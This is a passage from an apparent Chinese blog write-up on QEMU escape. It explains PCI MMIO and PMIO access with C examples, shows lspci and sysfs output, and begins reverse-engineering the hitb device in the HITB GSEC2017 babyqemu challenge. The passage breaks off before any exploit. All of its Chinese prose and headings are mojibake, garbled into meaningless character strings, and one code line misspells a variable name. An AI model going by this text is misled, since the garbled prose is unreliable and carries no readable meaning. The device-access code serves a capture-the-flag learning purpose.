class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem:\t%p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap userbuf&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(usebuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    userbuf_pa = va2pa(userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_va:\t%p\n&quot;</span>,userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_pa:\t%p\n&quot;</span>,(<span class="keyword">void</span> *)userbuf_pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCIè®¾å¤‡"><a href="#PCIè®¾å¤‡" class="headerlink" title="PCIè®¾å¤‡"></a>PCIè®¾å¤‡</h2><p>ç¬¦åˆ PCI æ€»çº¿æ ‡å‡†çš„è®¾å¤‡å°±è¢«ç§°ä¸º PCI è®¾å¤‡ï¼ŒPCI æ€»çº¿æ¶æ„ä¸­å¯ä»¥åŒ…å«å¤šä¸ª PCI è®¾å¤‡ã€‚PCI è®¾å¤‡åŒæ—¶ä¹Ÿåˆ†ä¸ºä¸»è®¾å¤‡å’Œç›®æ ‡è®¾å¤‡ä¸¤ç§ï¼Œä¸»è®¾å¤‡æ˜¯ä¸€æ¬¡è®¿é—®æ“ä½œçš„å‘èµ·è€…ï¼Œè€Œç›®æ ‡è®¾å¤‡åˆ™æ˜¯è¢«è®¿é—®è€…ã€‚</p><h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p>è€Œåœ¨è®¾å¤‡ä¸­å­˜åœ¨ä¸åŒçš„åœ°å€æ˜ å°„æ¨¡å¼ã€‚è€Œmmioåˆ™æ˜¯å†…å­˜æ˜ å°„ioï¼Œå’Œå†…å­˜å…±äº«ä¸€ä¸ªåœ°å€ç©ºé—´ã€‚å¯ä»¥å’Œåƒè¯»å†™å†…å­˜ä¸€æ ·è¯»å†™å…¶å†…å®¹ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t01a97028b7de9d6955.png"                      alt="t01a97028b7de9d6955"                ></p><ul><li>  Bit 0ï¼šRegion Typeï¼Œæ€»æ˜¯ä¸º 0ï¼Œç”¨äºåŒºåˆ†æ­¤ç±»å‹ä¸º Memory</li><li>  Bits 2-1ï¼šLocatableï¼Œä¸º 0 æ—¶è¡¨ç¤ºé‡‡ç”¨ 32 ä½åœ°å€ï¼Œä¸º 2 æ—¶è¡¨ç¤ºé‡‡ç”¨ 64 ä½åœ°å€ï¼Œä¸º 1 æ—¶è¡¨ç¤ºåŒºé—´å¤§å°å°äº 1MB</li><li>  Bit 3ï¼šPrefetchableï¼Œä¸º 0 æ—¶è¡¨ç¤ºå…³é—­é¢„å–ï¼Œä¸º 1 æ—¶è¡¨ç¤ºå¼€å¯é¢„å–</li><li>  Bits 31-4ï¼šBase Addressï¼Œä»¥ 16 å­—èŠ‚å¯¹é½åŸºå€</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/mmio_mem.png"                      alt="mmio_mem"                ></p><p><strong>åœ¨ç”¨æˆ·æ€ä¸‹è®¿é—®mmioç©ºé—´ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åœ¨å†…æ ¸æ€ä¸‹è®¿é—®mmioç©ºé—´ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><h3 id="pmio"><a href="#pmio" class="headerlink" title="pmio"></a>pmio</h3><p>ç«¯å£æ˜ å°„ioï¼Œå†…å­˜å’Œioè®¾å¤‡æœ‰ä¸ªå­—ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œcpuéœ€è¦é€šè¿‡ä¸“é—¨çš„æŒ‡ä»¤æ‰èƒ½å»è®¿é—®ã€‚åœ¨intelçš„å¾®å¤„ç†å™¨ä¸­ä½¿ç”¨çš„æŒ‡ä»¤æ˜¯INå’ŒOUTã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio.png"                      alt="pmio"                ></p><ul><li>  Bit 0ï¼šRegion Typeï¼Œæ€»æ˜¯ä¸º 1ï¼Œç”¨äºåŒºåˆ†æ­¤ç±»å‹ä¸º I/O</li><li>  Bit 1ï¼šReserved</li><li>  Bits 31-2ï¼šBase Addressï¼Œä»¥ 4 å­—èŠ‚å¯¹é½åŸºå€</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio_layout.png"                      alt="pmio_layout"                ></p><p><strong>è®¿é—®pmioä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h3><p>pciå¤–è®¾åœ°å€ï¼Œå½¢å¦‚<code>0000:00:1f.1</code>ã€‚ç¬¬ä¸€ä¸ªéƒ¨åˆ†16ä½è¡¨ç¤ºåŸŸï¼›ç¬¬äºŒä¸ªéƒ¨åˆ†8ä½è¡¨ç¤ºæ€»çº¿ç¼–å·ï¼›ç¬¬ä¸‰ä¸ªéƒ¨åˆ†5ä½è¡¨ç¤ºè®¾å¤‡å·ï¼›æœ€åä¸€ä¸ªéƒ¨åˆ†è¡¨ç¤º3ä½è¡¨ç¤ºåŠŸèƒ½å·ã€‚ä¸‹é¢æ˜¯lspciçš„è¾“å‡ºï¼Œå…¶ä¸­pciè®¾å¤‡çš„åœ°å€ï¼Œåœ¨æœ€å¤´éƒ¨ç»™å‡ºï¼Œç”±äºpcè®¾å¤‡æ€»åªæœ‰ä¸€ä¸ª0å·åŸŸï¼Œéšæ„ä¼šçœç•¥åŸŸã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204154525744.png"                      alt="image-20230204154525744"                ></p><p>åœ¨<code>/sys/bus/pci/devices</code>å¯ä»¥æ‰¾åˆ°æ¯ä¸ªæ€»çº¿è®¾å¤‡ç›¸å…³çš„ä¸€å†™æ–‡ä»¶ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155149832.png"                      alt="image-20230204155149832"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155333889.png"                      alt="image-20230204155333889"                ></p><p>æ¯ä¸ªè®¾å¤‡çš„ç›®å½•ä¸‹<code>resource0</code> å¯¹åº”MMIOç©ºé—´ã€‚<code>resource1</code> å¯¹åº”PMIOç©ºé—´ã€‚<br>resourceæ–‡ä»¶é‡Œé¢ä¼šè®°å½•ç›¸å…³çš„æ•°æ®ï¼Œç¬¬ä¸€è¡Œå°±æ˜¯mimoçš„ä¿¡æ¯ï¼Œä»å·¦åˆ°å³æ˜¯ï¼šèµ·å§‹åœ°å€ã€ç»“æŸåœ°å€ã€æ ‡è¯†ä½ã€‚</p><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><p><del>å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡ç©qemué€ƒé€¸ï¼Œæ‰€ä»¥é¢˜ç›®è®°å½•çš„æ¯”è¾ƒè¯¦ç»†ï¼Œåå‘æ–°æ‰‹å‘ï¼</del></p><h3 id="åˆ†æç¨‹åº"><a href="#åˆ†æç¨‹åº" class="headerlink" title="åˆ†æç¨‹åº"></a>åˆ†æç¨‹åº</h3><p>é¦–å…ˆæ³¨æ„çš„æ˜¯åŠ è½½æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/<span class="built_in">local</span>/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ -device é€‰é¡¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è®¾å¤‡ä¸º hitb è¿™ä¸ªpciè®¾å¤‡ã€‚</p><p>é‚£ä¹ˆé€†å‘çš„æ–¹æ³•å°±æ˜¯å°†qemu-system-x86_64æ‹–å…¥idaæœç´¢hitb</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204162747766.png"                      alt="image-20230204162747766"                ></p><p>é¦–å…ˆåˆ™æ˜¯å…ˆè§‚å¯Ÿinitå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">         <span class="number">469</span>,</span><br><span class="line">         <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  BYTE4(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">16</span>;</span><br><span class="line">  HIWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">2</span>].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">4660</span>;</span><br><span class="line">  WORD1(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨initåˆå§‹åŒ–å‡½æ•°ï¼Œéœ€è¦å°†è®¾å¤‡ç±»å‹å®šä¹‰ä¸ºPCIDeviceClassç»“æ„ä½“ã€‚PCIDeviceClassç»“æ„ä½“åœ¨Local typeä¸­å¯ä»¥æ‰¾åˆ°å®ƒçš„æè¿°å®šä¹‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DeviceClass_0 parent_class;</span><br><span class="line">  <span class="keyword">void</span> (*realize)(PCIDevice_0 *, Error_0 **);    <span class="comment">//0xc0</span></span><br><span class="line">  <span class="keyword">int</span> (*init)(PCIDevice_0 *);</span><br><span class="line">  PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">  PCIConfigReadFunc *config_read;</span><br><span class="line">  PCIConfigWriteFunc *config_write;</span><br><span class="line">  <span class="keyword">uint16_t</span> vendor_id;    <span class="comment">//0xe8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> device_id;    <span class="comment">//0xea</span></span><br><span class="line">  <span class="keyword">uint8_t</span> revision;</span><br><span class="line">  <span class="keyword">uint16_t</span> class_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_vendor_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_id;</span><br><span class="line">  <span class="keyword">int</span> is_bridge;</span><br><span class="line">  <span class="keyword">int</span> is_express;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *romfile;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹ç»“æ„ä½“å†ä¿®æ”¹initå‡½æ•°ä¸­çš„å˜é‡å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> PCIDeviceClass struc ; (<span class="keyword">sizeof</span>=<span class="number">0x108</span>, align=<span class="number">0x8</span>, copyof_1371)</span><br><span class="line"><span class="number">00000000</span> parent_class DeviceClass_0 ?</span><br><span class="line"><span class="number">000000</span>C0 realize dq ?                            ; offset</span><br><span class="line"><span class="number">000000</span>C8 init dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D0 <span class="built_in">exit</span> dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D8 config_read dq ?                        ; offset</span><br><span class="line"><span class="number">000000E0</span> config_write dq ?                       ; offset</span><br><span class="line"><span class="number">000000E8</span> vendor_id dw ?</span><br><span class="line"><span class="number">000000</span>EA device_id dw ?</span><br><span class="line"><span class="number">000000</span>EC revision db ?</span><br><span class="line"><span class="number">000000</span>ED db ? ; undefined</span><br><span class="line"><span class="number">000000</span>EE class_id dw ?</span><br><span class="line"><span class="number">000000F</span>0 subsystem_vendor_id dw ?</span><br><span class="line"><span class="number">000000F</span>2 subsystem_id dw ?</span><br><span class="line"><span class="number">000000F</span>4 is_bridge dd ?</span><br><span class="line"><span class="number">000000F</span>8 is_express dd ?</span><br><span class="line"><span class="number">000000F</span>C db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>D db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>E db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>F db ? ; undefined</span><br><span class="line"><span class="number">00000100</span> romfile dq ?                            ; offset</span><br><span class="line"><span class="number">00000108</span> PCIDeviceClass ends</span><br><span class="line"><span class="number">00000108</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è®¾å¤‡å·device_id=0x2333ï¼ŒåŠŸèƒ½å·vendor_id=0x1234</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci -v</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /sys/bus/pci/devices/0000\:00\:04.0/</span></span><br><span class="line">broken_parity_status      firmware_node             rescan</span><br><span class="line">class                     irq                       resource</span><br><span class="line">config                    local_cpulist             resource0</span><br><span class="line">consistent_dma_mask_bits  local_cpus                subsystem</span><br><span class="line">d3cold_allowed            modalias                  subsystem_device</span><br><span class="line">device                    msi_bus                   subsystem_vendor</span><br><span class="line">dma_mask_bits             numa_node                 uevent</span><br><span class="line">driver_override           power                     vendor</span><br><span class="line"><span class="built_in">enable</span>                    remove</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 